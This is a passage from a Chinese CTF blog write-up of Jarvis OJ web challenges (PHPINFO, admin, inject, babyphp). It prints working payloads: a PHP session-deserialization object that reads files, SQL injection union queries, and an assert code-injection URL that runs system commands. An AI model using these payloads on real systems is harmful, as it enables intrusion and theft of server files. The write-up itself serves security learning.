+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/df4X0wO.jpg" alt="15229463662905"></p>
+<p>生成的payload需要转义,并且前面加上<code>|</code> 这是session的格式</p>
+<p><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br><img src="https://i.imgur.com/ehJDN5q.jpg" alt="15229463906635"></p>
+<p>看到flag文件,因为phpinfo可以知道路径所以payload是:</p>
+<p><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></p>
+<p>学习资料:</p>
+<ul>
+<li><a href="https://github.com/80vul/phpcodz" target="_blank" rel="external">各类php特性</a></li>
+</ul>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p><img src="https://i.imgur.com/mgjvixo.jpg" alt="15229120355609"></p>
+<p>BurpSuite<br><img src="https://i.imgur.com/ehJDN5q.jpg" alt="15229463906635"></p>
+<p>改成1即可</p>
+<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p> index.php~ 查看源码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p> <code>http://web.jarvisoj.com:32794/index.php?table=flag</code> <code>where 1=2 union select TABLE_NAME from information_schema.tables</code></p>
+<p> <code>http://web.jarvisoj.com:32794/index.php?table=flag</code> <code>where 1=2 union select COLUMN_NAME from information_schema.columns</code></p>
+<p> <code>http://web.jarvisoj.com:32794/index.php?table=flag</code> <code>where 1=2 union select  flagUwillNeverKnow from secret_flag</code></p>
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p><code>.git</code>信息泄露</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>assert会把输入的东西当作php代码来执行</p>
+<p>构造语句</p>
+<p><code>http://web.jarvisoj.com:32798/?page=flag%27.system(%22ls%20templates/;%22).%27</code><br><img src="https://i.imgur.com/wBu21FR.jpg" alt="15229473184097"></p>
+<p><code>view-source:http://web.jarvisoj.com:32798/?page=flag%27.system(%22cat%20templates/flag.php;%22).%27</code></p>
+<p><img src="https://i.imgur.com/BDvmFcV.jpg" alt="15229473411995"></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/01/2018-3月资源汇总/" rel="next" title="2018-3月资源汇总">
+                <i class="fa fa-chevron-left"></i> 2018-3月资源汇总
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/27/CobaltStrike学习笔记续二/" rel="prev" title="CobaltStrike学习笔记续二">
+                CobaltStrike学习笔记续二 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2018/04/18/Jarvis-OJ-平台Writeup/"
+           data-title="Jarvis OJ 平台Writeup" data-url="http://yoursite.com/2018/04/18/Jarvis-OJ-平台Writeup/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PORT51"><span class="nav-number">1.</span> <span class="nav-text">PORT51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">2.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">3.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">4.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IN-A-Mess"><span class="nav-number">5.</span> <span class="nav-text">IN A Mess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Re"><span class="nav-number">6.</span> <span class="nav-text">Re</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">7.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chopper"><span class="nav-number">8.</span> <span class="nav-text">Chopper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">9.</span> <span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-Injection"><span class="nav-number">10.</span> <span class="nav-text">Simple Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#api调用"><span class="nav-number">11.</span> <span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片上传漏洞"><span class="nav-number">12.</span> <span class="nav-text">图片上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHPINFO"><span class="nav-number">13.</span> <span class="nav-text">PHPINFO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#admin"><span class="nav-number">14.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inject"><span class="nav-number">15.</span> <span class="nav-text">inject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyphp"><span class="nav-number">16.</span> <span class="nav-text">babyphp</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
